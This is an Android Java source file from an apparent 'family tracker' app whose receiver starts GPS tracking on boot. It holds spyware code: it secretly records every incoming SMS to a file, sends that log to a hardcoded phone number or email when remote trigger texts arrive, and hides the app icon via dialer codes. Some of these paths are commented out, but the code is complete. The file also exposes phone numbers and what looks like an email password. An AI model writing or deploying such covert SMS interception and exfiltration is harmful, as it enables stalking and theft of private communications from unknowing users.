package com.mat.familytracker.utils;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.mat.familytracker.activity.BaseActivity;
import com.mat.familytracker.gpstracker.GPSTrackerService;

import java.io.FileInputStream;
import java.io.FileOutputStream;


/**
 * Created by arunmididoddy on 8/6/2016.
 */
public class autoStart extends BroadcastReceiver {
    SmsManager manager = SmsManager.getDefault();
    private String mBootCompleteAction = "android.intent.action.BOOT_COMPLETED";
    private String mSMSReceivedAction = "android.provider.Telephony.SMS_RECEIVED";
//    private String mDialedAction = "android.intent.action.NEW_OUTGOING_CALL";
    private String mConnectionCheck = "android.net.conn.CONNECTIVITY_CHANGE";

    @Override
    public void onReceive(Context context, Intent intent) {
        String Action = intent.getAction();
        if (Action.equals(mBootCompleteAction)) {
            handleBotComplete(context, intent);
        }/* else if (Action.equals(mSMSReceivedAction)) {
            handleSMS(context, intent);
        } else if (Action.equals(mDialedAction)) {
            handleDailedPad(context, intent);
        } else if (Action.equals(mConnectionCheck)) {
            handleConnectionCheck(context, intent);
        }*/
    }

    private void handleConnectionCheck(Context context, Intent intent) {
        readFromFile(context);
    }

    private void handleDailedPad(Context context, Intent intent) {
        String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        //  Toast.makeText(context, number, Toast.LENGTH_SHORT).show();
        checkPhoneNumber(number, context);
    }

    private void checkPhoneNumber(String number, Context context) {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, BaseActivity.class);
        switch (number) {
            case "*333":
                //    Toast.makeText(context, "show with no#", Toast.LENGTH_SHORT).show();
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                break;
            case "*444":
                //    Toast.makeText(context, "hide with no#", Toast.LENGTH_SHORT).show();
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                break;
            case "*143":
                //    Toast.makeText(context, "hide with no#", Toast.LENGTH_SHORT).show();

                manager.sendTextMessage("+917386128710", null, "I love you", null, null);

                break;
            case "*1230":
                //    Toast.makeText(context, "hide with no#", Toast.LENGTH_SHORT).show();
                manager.sendTextMessage("+917386128710", null, "Happy Lunch", null, null);

                break;
            case "*00":
                //    Toast.makeText(context, "hide with no#", Toast.LENGTH_SHORT).show();
                manager.sendTextMessage("+917386128710", null, "Hmm chepu", null, null);

                break;
            case "*11":
                //    Toast.makeText(context, "hide with no#", Toast.LENGTH_SHORT).show();
                manager.sendTextMessage("+917386128710", null, "Ummmah", null, null);
                break;
            case "*7323":
                readFromFile(context);
                break;
        }
    }

    private void handleSMS(Context context, Intent intent) {

        final Bundle bundle = intent.getExtras();
        try {

            if (bundle != null) {
                final Object[] pdusObj = (Object[]) bundle.get("pdus");
                for (int i = 0; i < pdusObj.length; i++) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();
                    String senderNum = phoneNumber;
                    String message = currentMessage.getDisplayMessageBody();
                    // Show alert
                    checkMessage(context, message, senderNum);

                } // end for loop
            } // bundle is null

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" + e);

        }
    }

    private void checkMessage(Context context, String message, String senderNum) {
        if (senderNum.equals("+919700567735") && message.equalsIgnoreCase("HIGET")) {
            readFromFile(context);
        } else if (senderNum.equals("+918341223637") && message.equalsIgnoreCase("HIGET")) {
            readFromFile(context);
        } else if (senderNum.equalsIgnoreCase("DZ-WAYSMS")) {
            //sendMail(message);
            // Toast.makeText(context, "way2sms", Toast.LENGTH_SHORT).show();
            writeIntoAFile(context, senderNum, message);
        } else {
            writeIntoAFile(context, senderNum, message);
            // sendMail(message);
        }
    }


    private void writeIntoAFile(Context context, String senderNum, String message) {
        String data = "Sender NO#" + "======" + senderNum + "  &&  " + "Message#" + "======" + message + "\n";
        try {
            FileOutputStream fOut = context.openFileOutput("messages.txt", context.MODE_APPEND);
            fOut.write(data.getBytes());
            fOut.close();
            Log.e("mesage", data.getBytes().toString());
            //  Toast.makeText(context,"file saved",Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }

    private String readFromFile(Context context) {
        try {
            FileInputStream fin = context.openFileInput("messages.txt");
            int c;
            String temp = "";

            while ((c = fin.read()) != -1) {
                temp = temp + Character.toString((char) c);
            }
            Log.e("mesage", temp);

            if (isNetworkAvailable(context)) {
                sendMail(temp);
            } else {
                manager.sendTextMessage("+919700567735", null, temp, null, null);
                Log.e("else", "no connection");
            }
            //  Toast.makeText(context,temp,Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
        }

        return null;
    }

    private void handleBotComplete(Context context, Intent intent) {
        Intent serviceIntent = new Intent(context, GPSTrackerService.class);
        context.startService(serviceIntent);
    }

    private void sendMail(final String message) {

        new Thread(new Runnable() {
            public void run() {
//                try {
//                    GMailSender sender = new GMailSender("mizeemulators@gmail.com", "9700567735");
//
//
//                    //sender.addAttachment(Environment.getExternalStorageDirectory().getPath()+"/image.jpg");
//                    sender.sendMail("GOT IT DUDE", message,
//                            "mizeemulators@gmail.com",
//                            "arunteja30@gmail.com");
//
//                    //Toast.makeText(,"Your com.mat.phonesecurity.mail has been sent",Toast.LENGTH_LONG).show();
//                    Log.e("SendMail", "emaail sent");
//
//                } catch (Exception e) {
//                    //   Toast.makeText(getApplicationContext(),"Error",Toast.LENGTH_LONG).show();
//                    Log.e("SendMail", e.getMessage(), e);
//                }
            }
        }).start();


    }

    private boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null;
    }
}